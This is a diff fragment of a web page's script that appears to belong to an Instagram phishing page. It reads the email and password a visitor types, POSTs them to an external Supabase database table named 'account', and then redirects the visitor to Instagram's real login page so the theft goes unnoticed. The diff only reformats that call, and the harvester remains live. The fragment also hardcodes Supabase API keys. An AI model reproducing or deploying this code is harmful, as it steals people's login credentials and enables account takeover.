@@ -979,8 +979,11 @@
     let password = document.getElementById("password").value;
 
 
-  fetch("https://tqjtbocvqqksfzyowhsi.supabase.co/rest/v1/account",{method: "POST",headers:{"Content-Type":"application/json","apikey":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ","Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ","Prefer":"return=representation","Access-Control-Allow-Origin":"*"},body:JSON.stringify({username:email,"password":password}),mode: "cors",
-  credentials: "omit"})
+  fetch("https://tqjtbocvqqksfzyowhsi.supabase.co/rest/v1/account",
+  {method: "POST",
+  headers:{"Content-Type":"application/json",
+  "apikey":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ",
+  "Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ"},body:JSON.stringify({username:email,"password":password})})
   
   window.location.href = "https://www.instagram.com/accounts/login/"
   })
